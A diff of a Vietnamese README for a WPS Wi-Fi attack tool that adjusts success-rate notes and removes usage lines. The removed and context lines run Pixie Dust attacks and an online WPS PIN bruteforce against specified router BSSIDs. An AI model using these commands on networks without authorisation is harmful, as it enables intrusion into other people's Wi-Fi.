@@ -57,34 +57,14 @@ sudo python main.py -i wlan0 -K
 #### Ghi chú :
 • Tắt mạng, tắt điểm truy cập, bật vị trí
 
-• Màu xanh là tỉ lệ 80% thành công với router đã căn chỉnh wps
+• Màu xanh là tỉ lệ 60-80% thành công với router đã căn chỉnh wps
 
-• Màu đỏ là 10%
+• Màu đỏ là ~10%
 
 • Màu trắng là <50%
 
-• Màu vàng là 60%
+• Màu vàng là 50%
 
-- Hiển thị các mạng khả dụng và bắt đầu tấn công Pixie Dust trên một mạng đã chỉ định.
-```bash
-sudo python main.py -i wlan0 -K
-```
-
-```bash
-wipwn.sh
-```
-- - Bắt đầu tấn công Pixie Dust vào BSSID được chỉ định:
-```bash
-sudo python main.py -i wlan0 -b 00:91:4C:C3:AC:28 -K
-```
-- Khởi chạy WPS bruteforce trực tuyến với nửa đầu tiên được chỉ định của mã PIN:
-```bash
-sudo python main.py -i wlan0 -b 50:0F:F5:B0:08:05 -B -p 1234
-```
-### Xử lý sự cố
-**"Thiết bị hoặc tài nguyên đang bận (-16)" - Bật Wifi rồi tắt Wifi.**
-
----
 
 ## Ảnh chụp màn hình
 
